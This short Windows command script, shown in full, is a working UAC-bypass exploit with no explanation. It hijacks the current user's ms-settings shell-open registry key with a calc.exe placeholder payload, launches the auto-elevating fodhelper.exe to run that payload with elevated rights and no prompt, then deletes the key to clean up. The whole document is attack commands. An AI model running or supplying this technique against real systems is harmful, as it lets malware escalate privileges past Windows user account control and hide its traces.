reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f

"C:\Windows\System32\fodhelper.exe"

reg delete "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f
